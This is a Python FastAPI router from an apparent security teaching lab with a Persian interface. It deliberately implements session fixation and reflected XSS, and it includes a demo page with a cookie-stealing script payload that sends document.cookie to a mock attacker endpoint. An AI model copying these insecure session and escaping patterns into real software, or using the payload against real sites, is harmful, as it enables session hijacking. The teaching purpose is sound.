"""
Vulnerable Router - Demonstrates Session Fixation vulnerability.
DO NOT USE IN PRODUCTION - This is for educational purposes only!
"""
from typing import Optional
from fastapi import APIRouter, Request, Depends, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy.orm import Session

from database import get_db
from models import User, SessionData
from dependencies import get_user_from_vulnerable_session
from utils import hash_password, verify_password

router = APIRouter(prefix="/vulnerable", tags=["vulnerable"])
templates = Jinja2Templates(directory="templates")


@router.get("/", response_class=HTMLResponse)
async def vulnerable_home(request: Request):
    """Redirect to login page."""
    return RedirectResponse(url="/vulnerable/login", status_code=302)


@router.get("/login", response_class=HTMLResponse)
async def vulnerable_login_page(
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_db)
):
    """
    VULNERABLE: Display login page.
    If a token is provided in URL, we accept it as the session ID.
    This is the Session Fixation vulnerability!
    """
    response = templates.TemplateResponse(
        "login.html",
        {
            "request": request,
            "mode": "vulnerable",
            "theme_color": "#dc3545",  # Red for danger
            "mode_label": "حالت آسیب‌پذیر",
            "error": None,
            "token": token
        }
    )
    
    # VULNERABILITY: If token is provided, set it as the session cookie immediately
    # This allows an attacker to "fix" the session ID before authentication
    if token:
        # Create a session record in DB if it doesn't exist
        existing_session = db.query(SessionData).filter(
            SessionData.session_id == token
        ).first()
        
        if not existing_session:
            new_session = SessionData(session_id=token, user_id= None   )
            db.add(new_session)
            db.commit()
        
        # Set the cookie with the attacker-provided token
        response.set_cookie(
            key="vulnerable_session",
            value=token,
            httponly=False,  # Intentionally insecure
            samesite="lax"  # Changed from 'none' to work without HTTPS
        )
    
    return response


@router.post("/login", response_class=HTMLResponse)
async def vulnerable_login_submit(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db)
):
    """
    VULNERABLE: Process login.
    Uses the existing session ID from cookie without regenerating it.
    """
    # Find user
    user = db.query(User).filter(User.username == username).first()
    
    if not user or not verify_password(password, user.password_hash):
        return templates.TemplateResponse(
            "login.html",
            {
                "request": request,
                "mode": "vulnerable",
                "theme_color": "#dc3545",
                "mode_label": "حالت آسیب‌پذیر",
                "error": "نام کاربری یا رمز عبور اشتباه است",
                "token": None
            }
        )
    
    # Get existing session ID from cookie
    existing_session_id = request.cookies.get("vulnerable_session")
    
    if existing_session_id:
        # VULNERABILITY: We use the existing session ID without regenerating!
        # This is the core of Session Fixation attack
        session_data = db.query(SessionData).filter(
            SessionData.session_id == existing_session_id
        ).first()
        
        if session_data:
            session_data.user_id = user.id
            db.commit()
            session_id = existing_session_id
        else:
            # If session doesn't exist, create it with the same ID
            new_session = SessionData(session_id=existing_session_id, user_id=user.id)
            db.add(new_session)
            db.commit()
            session_id = existing_session_id
    else:
        # No existing session, create new one (but still vulnerable to fixation via URL)
        import secrets
        session_id = secrets.token_hex(16)
        new_session = SessionData(session_id=session_id, user_id=user.id)
        db.add(new_session)
        db.commit()
    
    response = RedirectResponse(url="/vulnerable/dashboard", status_code=302)
    response.set_cookie(
        key="vulnerable_session",
        value=session_id,
        httponly=False,  # Intentionally insecure
        samesite="lax"  # Changed from 'none' to work without HTTPS
    )
    
    return response


@router.get("/register", response_class=HTMLResponse)
async def vulnerable_register_page(request: Request):
    """
    VULNERABLE: Display registration page.
    """
    return templates.TemplateResponse(
        "register.html",
        {
            "request": request,
            "mode": "vulnerable",
            "theme_color": "#dc3545",  # Red for danger
            "mode_label": "حالت آسیب‌پذیر",
            "error": None,
            "success": None
        }
    )


@router.post("/register", response_class=HTMLResponse)
async def vulnerable_register_submit(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    password_confirm: str = Form(...),
    db: Session = Depends(get_db)
):
    """
    VULNERABLE: Process user registration.
    """
    # Validate password confirmation
    if password != password_confirm:
        return templates.TemplateResponse(
            "register.html",
            {
                "request": request,
                "mode": "vulnerable",
                "theme_color": "#dc3545",
                "mode_label": "حالت آسیب‌پذیر",
                "error": "رمز عبور و تکرار آن مطابقت ندارند",
                "success": None
            }
        )
    
    # Validate password length
    if len(password) < 6:
        return templates.TemplateResponse(
            "register.html",
            {
                "request": request,
                "mode": "vulnerable",
                "theme_color": "#dc3545",
                "mode_label": "حالت آسیب‌پذیر",
                "error": "رمز عبور باید حداقل ۶ کاراکتر باشد",
                "success": None
            }
        )
    
    # Check if username already exists
    existing_user = db.query(User).filter(User.username == username).first()
    if existing_user:
        return templates.TemplateResponse(
            "register.html",
            {
                "request": request,
                "mode": "vulnerable",
                "theme_color": "#dc3545",
                "mode_label": "حالت آسیب‌پذیر",
                "error": "این نام کاربری قبلاً استفاده شده است",
                "success": None
            }
        )
    
    # Create new user with hashed password
    hashed_password = hash_password(password)
    new_user = User(username=username, password_hash=hashed_password)
    db.add(new_user)
    db.commit()
    
    return templates.TemplateResponse(
        "register.html",
        {
            "request": request,
            "mode": "vulnerable",
            "theme_color": "#dc3545",
            "mode_label": "حالت آسیب‌پذیر",
            "error": None,
            "success": f"کاربر '{username}' با موفقیت ایجاد شد! اکنون می‌توانید وارد شوید."
        }
    )


@router.get("/dashboard", response_class=HTMLResponse)
async def vulnerable_dashboard(
    request: Request,
    user: User = Depends(get_user_from_vulnerable_session),
    db: Session = Depends(get_db)
):
    """Vulnerable dashboard - shows user info and session ID."""
    if not user:
        return RedirectResponse(url="/vulnerable/login", status_code=302)
    
    session_id = request.cookies.get("vulnerable_session", "نامشخص")
    
    return templates.TemplateResponse(
        "dashboard.html",
        {
            "request": request,
            "mode": "vulnerable",
            "theme_color": "#dc3545",
            "mode_label": "حالت آسیب‌پذیر",
            "username": user.username,
            "session_id": session_id,
            "logout_url": "/vulnerable/logout"
        }
    )


@router.get("/logout")
async def vulnerable_logout(request: Request, db: Session = Depends(get_db)):
    """Logout and clear session."""
    session_id = request.cookies.get("vulnerable_session")
    
    if session_id:
        session = db.query(SessionData).filter(
            SessionData.session_id == session_id
        ).first()
        if session:
            db.delete(session)
            db.commit()
    
    response = RedirectResponse(url="/vulnerable/login", status_code=302)
    response.delete_cookie("vulnerable_session")
    return response


# =============================================================================
# 🔴 XSS VULNERABLE ENDPOINTS - Version 2.0
# =============================================================================

@router.get("/search", response_class=HTMLResponse)
async def vulnerable_search(
    request: Request,
    q: Optional[str] = None,
    user: User = Depends(get_user_from_vulnerable_session)
):
    """
    🔴 VULNERABLE: Reflected XSS endpoint.
    
    The 'q' parameter is reflected directly into HTML WITHOUT escaping.
    This allows attackers to inject malicious scripts.
    
    Attack example:
    /vulnerable/search?q=<script>fetch('/hacker/log?cookie='+document.cookie)</script>
    
    ⚠️ NEVER DO THIS IN PRODUCTION!
    """
    
    # Get username for display
    username = user.username if user else "مهمان"
    session_id = request.cookies.get("vulnerable_session", "نامشخص")
    
    # 🔴 VULNERABILITY: Directly embedding user input without escaping!
    # Jinja2 auto-escaping is disabled for this specific content
    search_result_html = ""
    if q:
        # This is intentionally vulnerable - DO NOT use in production
        search_result_html = f"""
        <div class="alert alert-info">
            <strong>نتایج جستجو برای:</strong> {q}
        </div>
        <div class="card">
            <div class="card-body">
                <p>شما جستجو کردید: <strong>{q}</strong></p>
                <p>متأسفانه نتیجه‌ای یافت نشد.</p>
            </div>
        </div>
        """
    
    # Build the full HTML page (with XSS vulnerability)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>جستجو | نسخه آسیب‌پذیر</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css">
        <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
        <style>
            * {{ font-family: 'Vazirmatn', sans-serif; }}
            body {{
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                min-height: 100vh;
            }}
            .navbar-custom {{ background-color: #dc3545 !important; }}
            .card-glass {{
                background: rgba(255, 255, 255, 0.95);
                border-radius: 20px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }}
            .warning-banner {{
                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
                color: white;
                padding: 15px;
                border-radius: 12px;
                margin-bottom: 20px;
            }}
            .session-box {{
                background: #1a1a1a;
                color: #00ff00;
                padding: 15px;
                border-radius: 8px;
                font-family: monospace;
                direction: ltr;
                word-break: break-all;
            }}
        </style>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark navbar-custom">
            <div class="container">
                <a class="navbar-brand fw-bold" href="/">🔐 آزمایشگاه امنیت نشست</a>
                <div class="d-flex align-items-center">
                    <span class="badge bg-light text-dark me-3 px-3 py-2">حالت آسیب‌پذیر</span>
                    <a href="/vulnerable/dashboard" class="text-white me-3">داشبورد</a>
                    <a href="/vulnerable/logout" class="text-white">خروج</a>
                </div>
            </div>
        </nav>
        
        <main class="container py-5">
            <div class="row justify-content-center">
                <div class="col-md-8">
                    <div class="card-glass p-5">
                        <div class="warning-banner text-center">
                            <h5>⚠️ هشدار: این صفحه آسیب‌پذیری XSS دارد!</h5>
                            <small>ورودی کاربر بدون پاکسازی در HTML نمایش داده می‌شود.</small>
                        </div>
                        
                        <h3 class="text-center mb-4">🔍 جستجوی آسیب‌پذیر</h3>
                        
                        <div class="mb-3 p-3 bg-light rounded">
                            <strong>👤 کاربر:</strong> {username}<br>
                            <strong>🔑 شناسه نشست:</strong>
                            <code class="session-box d-block mt-2">{session_id}</code>
                        </div>
                        
                        <form method="GET" action="/vulnerable/search" class="mb-4">
                            <div class="input-group">
                                <input type="text" name="q" class="form-control form-control-lg" 
                                       placeholder="عبارت جستجو..." value="{q or ''}">
                                <button type="submit" class="btn btn-danger btn-lg">جستجو</button>
                            </div>
                        </form>
                        
                        {search_result_html}
                        
                        <hr>
                        
                        <div class="alert alert-danger">
                            <h5>🎯 نحوه اجرای حمله XSS:</h5>
                            <p>این URL را در مرورگر باز کنید:</p>
                            <code class="d-block p-2 bg-dark text-success rounded" style="direction: ltr; font-size: 0.85rem;">
                                /vulnerable/search?q=&lt;script&gt;fetch('/hacker/log?cookie='+document.cookie)&lt;/script&gt;
                            </code>
                            <p class="mt-2 mb-0">
                                <small>سپس به <a href="/hacker/dashboard" target="_blank">پنل مهاجم</a> بروید تا کوکی سرقت شده را ببینید!</small>
                            </p>
                        </div>
                        
                        <div class="text-center mt-4">
                            <a href="/vulnerable/dashboard" class="btn btn-outline-danger">
                                بازگشت به داشبورد
                            </a>
                            <a href="/secure/search" class="btn btn-outline-success">
                                رفتن به نسخه امن
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </body>
    </html>
    """
    
    # Return HTML directly without Jinja2 auto-escaping
    return HTMLResponse(content=html_content)


@router.get("/xss-demo", response_class=HTMLResponse)
async def xss_demo_page(request: Request):
    """
    🔴 XSS Demo landing page with attack examples.
    """
    html_content = """
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>دمو حمله XSS</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css">
        <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
        <style>
            * { font-family: 'Vazirmatn', sans-serif; }
            body {
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                min-height: 100vh;
                color: white;
            }
            .attack-card {
                background: rgba(220, 53, 69, 0.2);
                border: 2px solid #dc3545;
                border-radius: 15px;
                padding: 25px;
                margin: 15px 0;
            }
            .code-block {
                background: #1a1a1a;
                color: #00ff00;
                padding: 15px;
                border-radius: 8px;
                font-family: monospace;
                direction: ltr;
                text-align: left;
                overflow-x: auto;
            }
            .step-number {
                background: #dc3545;
                color: white;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                margin-left: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container py-5">
            <h1 class="text-center mb-5">🔴 دمو حمله XSS و سرقت کوکی</h1>
            
            <div class="attack-card">
                <h3><span class="step-number">1</span> اول لاگین کنید</h3>
                <p>به صفحه لاگین بروید و وارد شوید تا کوکی نشست ایجاد شود:</p>
                <a href="/vulnerable/login" class="btn btn-danger">ورود به نسخه آسیب‌پذیر</a>
            </div>
            
            <div class="attack-card">
                <h3><span class="step-number">2</span> لینک مخرب را باز کنید</h3>
                <p>این لینک حاوی کد JavaScript مخرب است که کوکی شما را سرقت می‌کند:</p>
                <div class="code-block">
                    <a href="/vulnerable/search?q=<script>fetch('/hacker/log?cookie='+document.cookie)</script>" 
                       style="color: #ff6b6b; word-break: break-all;">
                        /vulnerable/search?q=&lt;script&gt;fetch('/hacker/log?cookie='+document.cookie)&lt;/script&gt;
                    </a>
                </div>
                <small class="text-warning mt-2 d-block">⚠️ کلیک روی این لینک کوکی شما را به سرور مهاجم ارسال می‌کند!</small>
            </div>
            
            <div class="attack-card">
                <h3><span class="step-number">3</span> کوکی سرقت شده را ببینید</h3>
                <p>به پنل مهاجم بروید تا کوکی سرقت شده را مشاهده کنید:</p>
                <a href="/hacker/dashboard" class="btn btn-dark" target="_blank">💀 پنل مهاجم</a>
            </div>
            
            <div class="attack-card">
                <h3><span class="step-number">4</span> Session Hijacking</h3>
                <p>اکنون مهاجم می‌تواند با کوکی سرقتی وارد حساب شما شود:</p>
                <div class="code-block">
                    document.cookie = "vulnerable_session=STOLEN_SESSION_ID"
                </div>
            </div>
            
            <div class="text-center mt-5">
                <a href="/" class="btn btn-outline-light btn-lg">بازگشت به صفحه اصلی</a>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

